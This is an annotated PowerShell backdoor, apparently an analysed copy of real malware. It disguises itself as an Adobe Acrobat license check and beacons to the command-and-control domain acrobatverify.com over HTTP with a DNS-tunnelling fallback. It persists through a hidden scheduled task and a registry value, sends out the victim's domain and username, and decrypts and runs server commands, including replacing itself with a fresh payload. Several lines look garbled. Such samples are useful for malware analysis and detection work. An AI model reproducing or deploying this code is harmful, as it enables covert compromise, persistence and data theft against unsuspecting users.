cmd /c start /b schtasks /delete /tn Conhost /f

# DB64 function takes input and decodes it and then convert to text from base64 string
function DB64([string]$encoded){
    $nsp = $encoded -replace ' '                    # Removing any space
    $strb = new-object System.Text.StringBuilder    # Mutable String of characters
    
    for($i=0; $i -lt $nsp.Length; $i++){            # This loop will take each char from the input and replace:
        if($nsp[$i] -eq '0' ){                      
            if($nsp[$i+1] -eq '0'){                 # 00 with 0
                $null = $strb.Append('0')        
            }        
            if($nsp[$i+1] -eq '1'){                 # 01 with =
                $null = $strb.Append('=')        
            }        
            if($nsp[$i+1] -eq '2'){                 # 02 with /
                $null = $strb.Append('/')        
            }        
            if($nsp[$i+1] -eq '3'){                 # 03 with +
                $null = $strb.Append('+')         
            }        $i++;    
        }    
        else{                                      # else add the char as it is
            $null = $strb.Append($nsp[$i])    
        }                                          
    }                                              # This loop is converting the input to base64 string, where few characters of b64 string are encoded
    $newarr = $strb.ToString()
    $decoded = [System.Convert]::FromBase64String($newarr);   # Decodeing Base64 string
    $decoded;
}            


# EB64 function takes input convert to base64 string, and then encodes it
function EB64([byte[]]$decoded){
    $nsp = [System.Convert]::ToBase64String($decoded)     # Convert Input to base64 string
    $strb = new-object System.Text.StringBuilder
    for($i=0;$i -lt $nsp.Length;$i++){    
        if($nsp[$i] -eq '0' ){        
            $null = $strb.Append('00')                    # Encode string, by replacing 0 with 00
        }    
        elseif($nsp[$i] -eq '='){        
            $null = $strb.Append('01')                    # Encode string, by replacing "=" with 01
        }     
        elseif($nsp[$i] -eq '/'){        
            $null = $strb.Append('02')                    # Encode string, by replacing "/" with 02
        }    
        elseif($nsp[$i] -eq '+'){        
            $null = $strb.Append('03')                    # Encode string, by replacing "+" with 03
        }    
        else{        
            $null = $strb.Append($nsp[$i])    
        }
    }
    $strb.ToString()
}

# DAES Function takes key and bytes and then decrypts the AES encrypted bytes using the key
function DAES($key, $bytes){ 
    $IV = $bytes[0..15];                  # Extracts IV from the encrypted string
    $aeM = MA $key $IV;                   # Creates AES Object from the IV and KEY
    $decryptor = $aeM.CreateDecryptor();  # Decrypts the message
    $ueData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $ueData;
}

# EAES Function takes key and bytes and then encrypts bytes using the key and AES encryption
function EAES($key, $bytes){ 
    $aeM = MA $key;                    # Creates AES Object from the IV and KEY
    $ueData = $de                  
    $encryptor = $aeM.CreateEncryptor();    
    $ueData = $de
    $eData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);      
    $ueData = $de
    [byte[]] $fullData = $aeM.IV + $eData ;     
    $ueData = $de
    $fullData;
}

# MA takes key and IV and returns a AES object which is used to decrypt or encrypt
function MA($key, $IV){
    $aeM =New-Object "System.Security.Cryptography.AesManaged"
    $aeM.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aeM.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aeM.BlockSize = 128
    $aeM.KeySize = 256
    if ($IV) { 
        if ($IV.getType().Name -eq "String") {  
            $aeM.IV = [System.Convert]::FromBase64String($IV) 
        } 
        else {  
            $aeM.IV = $IV 
        }
    }
    
    if ($key) { 
        if ($key.getType().Name -eq "String") {  
            $aeM.Key = [System.Convert]::FromBase64String($key) 
        } 
        else {  
            $aeM.Key = $key 
        }
    }
    return $aeM
}

# WebReq function is used to make web requests, it takes domain, request method, cookie, and body of the request and makes the request
function WebReq($domain,$method,$cookieval,$body){
    $url = 'https://www.'+$domain
    $ff= 0;
    while(1){
        $req = [System.Net.WebRequest]::Create($url);
        $req.UseDefaultCredentials = $true
        ([System.Net.HttpWebRequest]$req).UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
        
        $req.Proxy = [System.Net.WebRequest]::DefaultWebProxy
        $req.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        $cookiejar = new-object System.Net.CookieContainer;
        if($cookieval){ 
            $cookie = New-Object System.Net.Cookie("PHPSESSID",$cookieval); $cookiejar.Add($url, $cookie);
        }
        $req.CookieContainer = $cookiejar;
        $req.Method = $method;
        if($body){    
            $req.ContentType = "text/plain" 
            $req.ContentLength = $body.length 
            $requestStream = $req.GetRequestStream()    
            $req.servicepoint.Expect100continue =$false 
            $requestStream.Write([System.Text.Encoding]::ASCII.GetBytes($body),0,$body.length) 
            $requestStream.Close()
        }
        Try{    
            $resp = $req.GetResponse() 
            $test = (New-Object System.IO.StreamReader($resp.GetResponseStream())).ReadToEnd();    
            $z=0    
            if( ($resp.StatusCode -ne 200) -or ($test.Length -and (($test -replace ' ') -notmatch "^[A-Za-z0-9]*$")) ){
                1/$z
            }    
            break
        }
        Catch{    
            if(!$ff){        
                $ff=1        
                $url = 'http://www.'+$domain    
            }    
            else{        
                try{            
                    $id = $env:USERDOMAIN+'\'+$env:USERNAME            
                    $creds = new-object System.Net.NetworkCredential($id,"pass")            
                    $req.Credentials = $creds            
                    $resp = $req.GetResponse()      
                    $test = (New-Object System.IO.StreamReader($resp.GetResponseStream())).ReadToEnd();
                    $z=0            
                    if( ($resp.StatusCode -ne 200) -or ($test.Length -and (($test -replace ' ') -notmatch "^[A-Za-z0-9]*$")) ){
                        1/$z
                    }            
                    break        
                }        
                catch{            
                    return 0    
                }    
            }
        }
    }
    
    $cookies = $cookiejar.GetCookies($url);
    $test
    if( $cookies -and $cookies[0].Name -eq "PHPSESSID" -and $sessvar -ne $cookies[0].Value ){ 
        $cookies[0].Value
    }
}

# Query function is used to query the domain and retrun the ipv6 address of the domain. 
function Query($dname){   
    $try = 0;
    do{    
        if($try -ne 0){
            Start-Sleep -m 50
        }   
        try{        
            if($Global:osv){            
                $dn = $dname+'.'            
                $qq = nslookup.exe -q=aaaa $dn | where{$_ -match ".*:.*:.*"}            
                return [net.ipaddress]::Parse([System.Text.Encoding]::ASCII.GetString($qq[10..$qq.Length])).GetAddressBytes()        
            }else{            
                $r = Resolve-DnsName -Name $dname -Type AAAA -DnsOnly            
                return [System.Net.IPAddress]::Parse($r.IP6Address).GetAddressBytes()        
            }    
        }    
        catch{}    
        $try++
    }
    while($parts.length -ne 8 -and $try -lt 3)
    return 0;
}

# get-res function queries for various subdomains and add the result(i.e. ipv6) address to an array
function get-res($res,$rr){
    $data = @()
    $tmp = [byte[]]$res[12..15][array]::Reverse($tmp)
    $count = [System.BitConverter]::ToUInt32($tmp,0)            
    for($i=0;$i -lt $count;$i++){    
        $dname = 'www'+$i+'.'+$rr+".acrobatverify.com"  
        $data += Query  $dname
    }
    $dname = 'www.'+$rr+".acrobatverify.com"
    $res = Query $dname
    $f = [array]::IndexOf($data,[byte]124)            
    if( $f -ne -1 ){    
        if( $f -ne 0 ){            
            [System.Text.Encoding]::ASCII.GetString($data[0..($f-1)])    
        }    
        $l = [array]::IndexOf($data[($f+1)..$data.length],[byte]124)    
        if( $l -ne -1 ){       
            $length = [System.Convert]::ToInt32( [System.Text.Encoding]::ASCII.GetString($data[($f+1)..($f+$l)]) )        
            if( $length -gt 0 ){            
                $data[($f+2+$l)..($f+$l+1+$length)]        
            }
        }
    }
}

# DNS-Con function makes DNS request to the provided server.
function DNS-Con($dmode,$cookieavl,$pdata){
    $rr = (Get-Random -Min 100000 -Max 999999).ToString()
    if($dmode -eq 0){    
        $dname = 'mail.'+$rr+'.acrobatverify.com '   
        $res = Query $dname    
        $sdata = $env:USERDOMAIN+'\'+$env:USERNAME + ':pass'    
        $id = [System.Text.Encoding]::ASCII.GetBytes($sdata)    
        $did = EB64 $id    
        $dname = $did+'.'+$rr+'.acrobatverify.com'
    }
    
    else{
        $dname = 'ns1.'+$rr+'.acrobatverify.com'  
        $res = Query $dname    
        $dname = $cookieavl+'.'+$rr+'.acrobatverify.com'    
        $res = Query $dname    
        if($dmode -eq 2){        
            $count = [int][math]::Ceiling($pdata.length/60)        
            for($pn=0;$pn -lt $count ;$pn++){            
                $size = 60            
                if($pn -eq $count-1 -and $pdata.length%60 -gt 0)            {
                    $size=$pdata.length%60
                }            
                $dname = $pdata.substring(($pn*60),$size)+'.'+$rr+'.+acrobatverify.com'
                $res = Query $dname        
            }    
        }    
        $dname = 'ns2.'+$rr+'.acrobatverify.com'
    }
    
    $res = Query $dname
    $rval = get-res 
    $res $rr
    if( $rval ){
        $rval
    }
    else{
        return 0
    }
}

# Here all the function that were made are used to, send and recieve data from and to the C&C (Command and Control Server 
#---------------------------------------------------------------------------------------------------------------#
$Global:osv = 0

if([System.Environment]::OSVersion.Version.Major -eq 6 -and [System.Environment]::OSVersion.Version.Minor -lt 2){
    $Global:osv = 7
}
$ff = $env:temp+"\AdobeAcrobatLicenseVerify.vbs"

if((Test-Path $ff) -eq $false){
    [System.IO.File]::WriteAllText($ff,"CreateObject('WScript.Shell').Run `"`" & WScript.Arguments(0) & `"`", 0, False")
}

$task =  cmd /c start /b schtasks /query /fo csv | where{$_ -notmatch "TaskNa"} | findstr "AdobeAcrobatLicenseVerify"

$executable = "wscript.exe"

$run = $MyInvocation.MyCommand.Definition
$args = '"'+$ff + "`" \`"powershell.exe " +" -ExecutionPolicy bypass -WindowStyle hidden -NoProfile '"+$run+"' "+' \"'

if( $task -eq $null){    
    $tr = $executable+' '+ $args    
    
    cmd /c start /b schtasks /create /sc minute /mo 5 /tn "AdobeAcrobatLicenseVerify" /tr $tr 
}

$val = Get-ItemProperty -Path "hkcu:\" -Name "AdobeAcrobatLicenseVerify"

if( $val ){ 
    $vals = $val."AdobeAcrobatLicenseVerify" -split '_' 
    $sessvar = $vals[0]    
    $EPSK = $vals[1]
}

$dns=0

if(!$sessvar){    
    $http_res =  WebReq "acrobatverify.com" "GET"    
    $dns=0    
    if( $http_res -eq 0){        
        $dns = 1        
        $http_res = DNS-Con 0 
        $sessvar    
    }    
    if($http_res -is [system.array] -and $http_res[0].length -gt 1){        
        if($dns){            
            $sessvar = $http_res[0]            
            $EPSK = EB64 $http_res[1..$http_res.Length]        
        }        
        else{         
            $EPSK = $http_res[0]         
            $sessvar = $http_res[1]        
        }        
        $storingval = $sessvar+'_'+$EPSK  New-ItemProperty -path "hkcu:\" -Name "AdobeAcrobatLicenseVerify" -Value $storingval -force    
    }    
    else{exit}
}

Try{
    $http_res = WebReq "acrobatverify.com" "GET" $sessvar
    $dns=0
    if( $http_res -eq 0){    
        $dns = 1    
        $http_res = DNS-Con 1 
        $sessvar
    }    
    if($http_res -is [system.array] -and $http_res[1] -and $http_res[0] -and $http_res[0].length -gt 1){        
        if($dns){            
            $sessvar = $http_res[0]            
            $EPSK = EB64 $http_res[1..$http_res.Length]        
        }        
        else{            
            $EPSK = $http_res[0]         
            $sessvar = $http_res[1]        
        }        
        $storingval = $sessvar+'_'+$EPSK        
        New-ItemProperty -path "hkcu:\" -Name "AdobeAcrobatLicenseVerify" -Value $storingval -force        
        return    
    }    
    elseif( !$http_res -and !$http_res[0] )    {
        exit
    }
    
    $PSK = DB64 $EPSK 
    if($dns){
        $bytes = $http_res
    }
    else{ 
        $bytes = DB64 $http_res
    }
    
    $data = DAES $PSK $bytes
    
    if( [System.text.encoding]::ASCII.GetString($data[0..4]) -eq "hello"){
        $uuid = $data[5..40] 
        $type = [System.Text.Encoding]::ASCII.GetString($data[41]) 
        $d = $data[42..$data.length]    
        $prevdomain = "acrobatverify.com"    
        if($type -eq 'x'){        
            cmd /c start /b schtasks /delete  /tn "AdobeAcrobatLicenseVerify" /f        Remove-ItemProperty -path "hkcu:\" -Name "AdobeAcrobatLicenseVerify"     [System.IO.File]::WriteAllBytes($MyInvocation.MyCommand.Definition,$d[0..$d.length] )        
            
            $result = [System.Text.Encoding]::ASCII.GetBytes("bye") + $uuid + [System.Text.Encoding]::ASCII.GetBytes("d")     
            
            $Edata = EAES $PSK $result     
            
            $B64bytes = EB64 $Edata        
            
            if($dns -eq 0 ){
                $http_res = WebReq $prevdomain "POST" $sessvar $B64bytes
            }        
            else{
                $http_res = DNS-Con 2 $sessvar $B64bytes
            }        
            
            $nmodule = $executable+' '+ '"'+$ff + '" "powershell.exe' +' -ExecutionPolicy bypass -WindowStyle hidden -NoProfile "'+$run+'"'+' "'        cmd.exe /c $nmodule    
        }
    }
}
catch{
    exit
}
#---------------------------------------------------------------------------------------------------------------#